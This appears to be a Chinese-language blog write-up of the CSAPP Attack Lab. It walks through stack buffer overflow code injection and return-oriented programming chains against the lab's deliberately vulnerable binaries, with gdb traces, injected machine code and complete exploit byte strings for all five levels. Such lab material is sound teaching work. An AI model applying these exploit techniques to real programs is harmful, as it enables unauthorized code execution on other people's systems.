开始之前
下载代码文件
CSAPP的project可以从官方网站 上下载。其中project代码文件在Self-Study Handout 链接那里。使用如下命令下载datalab文件，并解压进入目录：
1 2 3 wget https://csapp.cs.cmu.edu/3e/target1.tar --no-check-certificate tar -xvf target1.tar cd target1
简要介绍
进入target1，会发现几个文件：cookie.txt、hex2raw、farm.c、ctarget、rtarget、README.txt。其中第1~3关为在ctarget实现代码注入攻击，第4~5关为在rtarget中实现返回值攻击。返回值攻击需要利用farm.c中的函数。其中hex2raw用于把ASCII码转化为字符串，如echo "31 32 33 34" | ./hex2raw会输出abcd。
大致流程如下：使用./ctarget -q命令运行ctarget，会提示输入字符串。如果输入的字符串过短，会出现
No exploit. Getbuf returned 0x1
如果输入字符串过长且不符合题目要求，会输出类似
Ouch!: You caused a segmentation fault!
或
Oops!: You executed an illegal instruction
或
Misfire: You called touch3(“”)
等等错误。这些情况都不算通过。只有输出类似
Touch3!: You called touch3(“59b997fa”)
的字样，才说明成功通关了。
题目的个人解答
level 1
仔细阅读以下代码(摘自writeup)：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 unsigned getbuf () { char buf[BUFFER_SIZE]; Gets(buf); return 1 ; } void touch1 () { vlevel=1 ; printf ("Touch1!: You called touch1()\n" ); validate(1 ); exit (0 ); } void test () { int val; val = getbuf(); printf ("No exploit. Getbuf returned 0x%x\n" , val); }
level 1 的目的是利用代码注入攻击，使得程序在执行test的getbuf函数后，不是正常执行test的printf函数而是调用touch1函数。
如何使得程序执行touch1呢？回忆一下程序调用函数的机制：当调用call时，程序压栈并将call的下一条指令地址存放在栈中。具体例子如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 (gdb) disas test Dump of assembler code for function test: 0x0000000000401968 <+0>: sub $0x8,%rsp 0x000000000040196c <+4>: mov $0x0,%eax 0x0000000000401971 <+9>: call 0x4017a8 <getbuf> 0x0000000000401976 <+14>: mov %eax,%edx 0x0000000000401978 <+16>: mov $0x403188,%esi 0x000000000040197d <+21>: mov $0x1,%edi 0x0000000000401982 <+26>: mov $0x0,%eax 0x0000000000401987 <+31>: call 0x400df0 <__printf_chk@plt> 0x000000000040198c <+36>: add $0x8,%rsp 0x0000000000401990 <+40>: ret End of assembler dump. (gdb) disas getbuf Dump of assembler code for function getbuf: 0x00000000004017a8 <+0>: sub $0x28,%rsp 0x00000000004017ac <+4>: mov %rsp,%rdi 0x00000000004017af <+7>: call 0x401a40 <Gets> 0x00000000004017b4 <+12>: mov $0x1,%eax 0x00000000004017b9 <+17>: add $0x28,%rsp 0x00000000004017bd <+21>: ret End of assembler dump. (gdb) info address touch1 Symbol "touch1" is a function at address 0x4017c0. (gdb) b *test+9 Breakpoint 1 at 0x401971: file visible.c, line 92. (gdb) b *getbuf+7 Breakpoint 2 at 0x4017af: file buf.c, line 14. (gdb) b *getbuf+12 Breakpoint 3 at 0x4017b4: file buf.c, line 16. (gdb) b *test+14 Breakpoint 4 at 0x401976: file /usr/include/x86_64-linux-gnu/bits/stdio2.h, line 105. (gdb) r -q Starting program: /home/debian/CSAPP/target1/ctarget -q [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". Cookie: 0x59b997fa Breakpoint 1, 0x0000000000401971 in test () at visible.c:92 92 visible.c: 没有那个文件或目录. (gdb) x/32x $rsp 0x5561dca8: 0x00000009 0x00000000 0x00401f24 0x00000000 0x5561dcb8: 0x00000000 0x00000000 0xf4f4f4f4 0xf4f4f4f4 0x5561dcc8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dcd8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dce8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dcf8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dd08: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dd18: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 (gdb) c Continuing. Breakpoint 2, 0x00000000004017af in getbuf () at buf.c:14 14 buf.c: 没有那个文件或目录. (gdb) x/32x $rsp 0x5561dc78: 0x00000000 0x00000000 0x00000000 0x00000000 0x5561dc88: 0x00000000 0x00000000 0x00000000 0x00000000 0x5561dc98: 0x55586000 0x00000000 0x00401976 0x00000000 0x5561dca8: 0x00000009 0x00000000 0x00401f24 0x00000000 0x5561dcb8: 0x00000000 0x00000000 0xf4f4f4f4 0xf4f4f4f4 0x5561dcc8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dcd8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dce8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 (gdb) c Continuing. Type string:00000000000000000000000 Breakpoint 3, getbuf () at buf.c:16 16 in buf.c (gdb) x/32x $rsp 0x5561dc78: 0x30303030 0x30303030 0x30303030 0x30303030 0x5561dc88: 0x30303030 0x00303030 0x00000000 0x00000000 0x5561dc98: 0x55586000 0x00000000 0x00401976 0x00000000 0x5561dca8: 0x00000009 0x00000000 0x00401f24 0x00000000 0x5561dcb8: 0x00000000 0x00000000 0xf4f4f4f4 0xf4f4f4f4 0x5561dcc8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dcd8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0x5561dce8: 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4 0xf4f4f4f4
上述例子中，在test执行call前、getbuf执行call前、getbuf执行call后、test执行call后设置了断点。
可以看出，test调用call进入getbuf后，栈指针由0x5561dca8变成0x5561dc78，且test中call下一条指令(mov %eax,%edx)的地址0x00401976存储在0x5561dca0附近。
还可以看出，写入的数据00000000000000000000000，存放在0x5561dc78开始之后的位置。因此，只要想办法写入数据，使得0x5561dca0附近的0x00401976变成touch的地址0x4017c0即可。由于getbuf分配了0x28，即40的地址，故目的地址需写在第40位以后。特别注意：填充的顺序是反过来的，即填充的字符(ASCII码)的顺序不是004017c0，而是c0174000。
为便于理解，以下是getbuf刚压栈(sub $0x28,%rsp)后的栈的情况：

因此，需要输入的字符串对应的ASCII码如下：
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
即实现以下效果：

以下是这道题的解法：
1 2 3 4 5 6 7 8 9 10 11 debian@debian:~/CSAPP/target1$ echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 0A" > in.txt debian@debian:~/CSAPP/target1$ ./hex2raw -i in.txt > out.txt debian@debian:~/CSAPP/target1$ ./ctarget -q -i out.txt Cookie: 0x59b997fa Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
level 2
仔细阅读以下代码(摘自writeup)：
1 2 3 4 5 6 7 8 9 10 11 12 void touch2 (unsigned val) { vlevel = 2 ; if (val == cookie) { printf ("Touch2!: You called touch2(0x%.8x)\n" , val); validate(2 ); } else { printf ("Misfire: You called touch2(0x%.8x)\n" , val); fail(2 ); } exit (0 ); }
touch2和touch1基本类似，不同之处在于多传了一个值。在 level 1 中，我们通过修改返回的地址使得程序运行完getbuf后跳转到touch1的地址。现在，虽然能够使getbuf执行完毕后跳转到touch2的地址，却无法修改传递给touch2的参数val(存放在寄存器rdi中)，怎么办呢？可以利用getbuf分配的栈空间。可以把返回地址修改为getbuf栈空间的某一位置，再往该栈空间存入修改rdi的代码和转到touch2的代码即可。
在gdb中输入i addr touch2可得到touch2的地址为0x4017ec。运行程序还知道cookie的值为0x59b997fa。
为了实现修改rdi，需要注入代码mov $0x59b997fa,%rdi；为了实现跳转到touch2，可利用push将touch2的地址送到栈顶；这样，当遇到ret指令时，rip寄存器的值将变成rsp所指向的内容(即touch2的地址)，这样，程序就跳转到了touch2。
因此注入的代码如下：
1 2 3 mov $0x59b997fa,%rdi push $0x4017ec ret
得到机器指令的方法如下：
1 2 3 echo -e 'mov $0x59b997fa,%rdi\npush $0x4017ec\nret' > inject.sgcc -c inject.s objdump -d inject.o
得到以下输出：
1 2 3 4 5 6 7 8 9 inject.o： 文件格式 elf64-x86-64 Disassembly of section .text: 0 000000000000000 <.text>: 0 : 48 c7 c7 fa 97 b9 59 mov $0 x59b997fa,%rdi 7 : 68 ec 17 40 0 0 push $0 x4017ec c: c3 ret
将注入的代码放在输入的开头(即执行到getbuf()时rsp的值)，经gdb设置断点，查看：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 (gdb) disas getbuf Dump of assembler code for function getbuf: 0x00000000004017a8 <+0>: sub $0x28,%rsp 0x00000000004017ac <+4>: mov %rsp,%rdi 0x00000000004017af <+7>: call 0x401a40 <Gets> 0x00000000004017b4 <+12>: mov $0x1,%eax 0x00000000004017b9 <+17>: add $0x28,%rsp 0x00000000004017bd <+21>: ret End of assembler dump. (gdb) b *getbuf+7 Breakpoint 1 at 0x4017af: file buf.c, line 14. (gdb) r -q Starting program: /home/debian/CSAPP/target1/ctarget -q [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". Cookie: 0x59b997fa Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14 14 buf.c: 没有那个文件或目录. (gdb) p $rsp $1 = (void *) 0x5561dc78
可知注入代码的地址为0x5561dc78，因此需要输入的字符串对应的ASCII码如下：
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
即实现以下效果：

以下是这道题的解法：
1 2 3 4 5 6 7 8 9 10 11 debian@debian:~/CSAPP/target1$ echo "48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 0A" > in.txt debian@debian:~/CSAPP/target1$ ./hex2raw -i in.txt > out.txt debian@debian:~/CSAPP/target1$ ./ctarget -q -i out.txt Cookie: 0x59b997fa Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
level 3
仔细阅读以下代码(摘自writeup)：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int hexmatch (unsigned val, char *sval) { char cbuf[110 ]; char *s = cbuf + random() % 100 ; sprintf (s, "%.8x" , val); return strncmp (sval, s, 9 ) == 0 ; } void touch3 (char *sval) { vlevel = 3 ; if (hexmatch(cookie, sval)){ printf ("Touch3!: You called touch3(\"%s\")\n" , sval); validate(3 ); } else { printf ("Misfire: You called touch3(\"%s\")\n" , sval); fail(3 ); } exit (0 ); }
根据以上代码可知，当sval和s的前9个字符相同即可通过。由sprintf(s, "%.8x", val);以及val为cookie，即0x59b997fa，可知s为59b997fa。也就是说，只需使得sval，即rdi寄存器存储着指向59b997fa字符串的指针即可。59b997fa的ASCII码为35 39 62 39 39 37 66 61 00。(特别注意后面的00)。
比较关键的一点是，59b997fa这个字符串存放在哪里呢？由于getbuf的rsp在0x5561dc78处(注入的代码也在这里开始)，touch3的rsp在0x5561dca0处，hexmatch的rsp在add $0xffffffffffffff80,%rsp指令之前在0x5561dc80处。因此，若字符串存放在小于0x5561dca0的地址处，会在touch3、hexmatch调用时被覆盖。这里选择在0x5561dca8处放入字符串59b997fa。
在gdb中输入i addr touch3可得到touch3的地址为0x4018fa。
综上，得到以下注入的代码：
1 2 3 mov $0x5561dca8,%rdi push $0x4018fa ret
转化为机器码如下：
1 2 3 4 0 000000000000000 <.text>: 0 : 48 c7 c7 a8 dc 61 55 mov $0 x5561dca8,%rdi 7 : 68 fa 18 40 0 0 push $0 x4018fa c: c3 ret
因此需要输入的字符串对应的ASCII码如下：
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
即实现以下效果：

以下是这道题的解法：
1 2 3 4 5 6 7 8 9 10 11 debian@debian:~/CSAPP/target1$ echo "48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 0a" > in.txt debian@debian:~/CSAPP/target1$ ./hex2raw -i in.txt > out.txt debian@debian:~/CSAPP/target1$ ./ctarget -q -i out.txt Cookie: 0x59b997fa Touch3!: You called touch3("59b997fa" ) Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
level 4
level 4 和 level 2 目标类似，不过 level 4 开启了栈随机化并让栈的代码不可执行，因此不能用注入代码的方式。level 4 采用的攻击方式是返回值攻击，即让getbuf函数返回时跳转到程序已有的其他函数(有点像 level 1)。不过，这种跳转并不是一定要跳转到函数的入口。如：
1 2 3 0 0000000004019a0 <addval_273>: 4019 a0: 8 d 87 48 89 c7 c3 lea -0 x3c3876b8(%rdi),%eax 4019 a6: c3 ret
如果跳转到4019a3，则程序实际执行89 c7 c3，即：
这里，为了实现给rdi寄存器赋值0x59b997fa，要用到pop。在popq命令(58~5f)中，经搜索，farm中只有58、5c能用，且其中addval_219和getval_280均执行popq %rax后便返回；getval_481则执行了popq %rsp和movl %eax,%edx。显然getval_481是不合适的，故还需要一条指令movl %eax,%edi，即89 c7，经查addval_273和setval_426均符合要求。现在选用addval_219和addval_273两个函数的一部分，其地址为0x4019ab和0x4019a3。val该放在哪里呢？如下图所示：

为什么要这样放置呢？可见如下的具体过程(以下各图为加黑代码执行完毕的结果)：
因此需要输入的字符串对应的ASCII码如下：
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a3 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
以下是这道题的解法：
1 2 3 4 5 6 7 8 9 10 11 debian@debian:~/CSAPP/target1$ echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a3 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00" > in.txt debian@debian:~/CSAPP/target1$ ./hex2raw -i in.txt > out.txt debian@debian:~/CSAPP/target1$ ./rtarget -q -i out.txt Cookie: 0x59b997fa Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A3 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
level 5
level 5 也类似 level 3，不过这里的地址是用相对于%rsp的偏移量表示的。如何计算地址呢？可以利用farm.c中的add_xy函数。为了大致确定哪些寄存器可以传值，对farm.c中的函数进行了细致的考察。能movl的寄存器如下：

同时，能通过popq改变寄存器中值的寄存器只有rax、rsp。因此，整个流程大致明朗了起来：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 0x401a06 <addval_190> movq %rsp,%rax ret # 0x4019c5 <setval_426>，把栈指针rsp作为第一个参数传给add_xy movq %rax,%rdi ret # 0x4019ab <addval_219>，把偏移量赋值给rax popq %rax ret # 偏移量存放位置，应为0x48，可通过gdb调试确定 # 0x4019dd <getval_481> movl %eax,%edx ret # 0x401a34 <getval_159> movl %edx,%ecx ret # 0x401a13 <addval_436>，把偏移量作为第二个参数传给add_xy movl %ecx,%esi ret # 0x4019d6 <add_xy> # 0x4019c5 <setval_426>，把add_xy的返回值(即字符串的地址)传给touch3 movq %rax,%rdi ret # 0x4018fa <touch3> # 字符串存放位置，内容为35 39 62 39 39 37 66 61 00
经检验，上述代码能通过，因此可以确定需要输入的字符串对应的ASCII码为：
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
如下图所示：
以下是这道题的解法：
1 2 3 4 5 6 7 8 9 10 11 debian@debian:~/CSAPP/target1$ echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00" > in.txt debian@debian:~/CSAPP/target1$ ./hex2raw -i in.txt > out.txt debian@debian:~/CSAPP/target1$ ./rtarget -q -i out.txt Cookie: 0x59b997fa Touch3!: You called touch3("59b997fa" ) Valid solution for level 3 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00